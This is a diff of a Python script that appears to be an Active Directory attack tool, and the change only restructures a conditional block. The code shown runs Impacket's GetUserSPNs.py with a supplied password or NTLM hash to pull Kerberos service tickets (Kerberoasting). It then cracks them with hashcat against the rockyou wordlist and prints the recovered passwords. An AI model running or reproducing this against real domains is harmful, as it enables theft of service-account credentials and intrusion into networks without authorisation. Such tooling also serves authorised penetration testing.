@@ -2087,17 +2087,16 @@ while True:
       checkParams = testTwo()      
       
       if checkParams != 1:
-         if linecache.getline('usernames.txt', 1) != " ":
-            if NTM[:5] != "EMPTY":
-               print("[i] Using HASH value as password credential...")
-               command(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -outputfile hashroast1.tmp")
-            else:
-               command(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -outputfile hashroast1.tmp")              
-            print("[*] Cracking hash values if they exists...\n")
-            command("hashcat -m 13100 --force -a 0 hashroast1.tmp /usr/share/wordlists/rockyou.txt -o cracked1.txt")
-            command("strings cracked1.txt")
+         if NTM[:5] != "EMPTY":
+            print("[i] Using HASH value as password credential...")
+            command(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -outputfile hashroast1.tmp")
          else:
-            print("[+] The file usernames.txt is empty...")
+            command(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -outputfile hashroast1.tmp")              
+         print("[*] Cracking hash values if they exists...\n")
+         command("hashcat -m 13100 --force -a 0 hashroast1.tmp /usr/share/wordlists/rockyou.txt -o cracked1.txt")
+         command("strings cracked1.txt")
+      else:
+         print("[+] The file usernames.txt is empty...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
